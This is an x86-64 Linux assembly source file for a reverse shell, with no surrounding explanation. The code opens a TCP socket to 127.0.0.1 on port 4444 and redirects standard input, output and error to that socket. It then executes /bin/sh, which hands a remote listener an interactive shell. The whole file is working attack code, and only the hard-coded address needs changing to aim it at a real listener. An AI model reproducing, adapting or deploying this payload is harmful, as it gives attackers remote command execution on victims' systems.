

section .text

global _start
_start:
	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	xor rdx, rdx
; ---------------------------------------------------------------------

create_socket:
	mov rdi, 2  ; ipv4 - first argument
	mov rsi, 1  ; tcp - second argument
	mov rdx, 0 
	mov rax, 41 ; socket syscall
	syscall

	mov r8, rax ; save socket fd

	
; ---------------------------------------------------------------------


connect_socket:
	mov rax, 0x000000000100007f ; 127.0.0.1
	push rax
	sub rsp, 4
	mov word[rsp], 2 ; set ipv4 for struct
	mov word[rsp+2], 0x5c11 ; set network port

	mov rdi, r8 ; set fd to first arg
	mov rsi, rsp ; set network struct to second arg
	mov rdx, 16 ; size of the struct
	mov rax, 42 ; connect syscall
	syscall
	add rsp, 4
	
	cmp rax, 0
	jz loop_dup
	mov rsi, fail_conn_msg
	mov rdx, fail_conn_msg_len
	jmp display_msg
; ---------------------------------------------------------------------


loop_dup:
	mov rdx, 2

; ---------------------------------------------------------------------

dup_fd:
	mov rax, 33 ; dup2 syscall
	mov rsi, rdx ; fd of stdin, stdout, stderr per loop
	mov rdi, r8  ; our socket fd
	syscall

	dec rdx
	cmp rdx, 0
	jge dup_fd


; ---------------------------------------------------------------------

shell:
	mov rax, 0x0068732f6e69622f ; /bin/sh
	push rax
	mov rdi, rsp ; first arg for execve
	mov rsi, 0x00 ;second arg for execve
	mov rdx, rsi  ; third arg for execve
	mov rax, 59  ; execve syscall
	syscall
	

; ---------------------------------------------------------------------
display_msg:
	mov rdi, 1 ; stdout
	mov rax, 1	; write syscall
	syscall
	jmp exit

; ---------------------------------------------------------------------

exit:
	mov rax, 60 ; exit syscall
	mov rdi, 1  ; exit first arg -> exit(1)
	syscall

; ---------------------------------------------------------------------

section .data
	fail_conn_msg db "[-] Could not connect to server, is the server listening ?", 0xa, 0xd
	fail_conn_msg_len equ $- fail_conn_msg

	









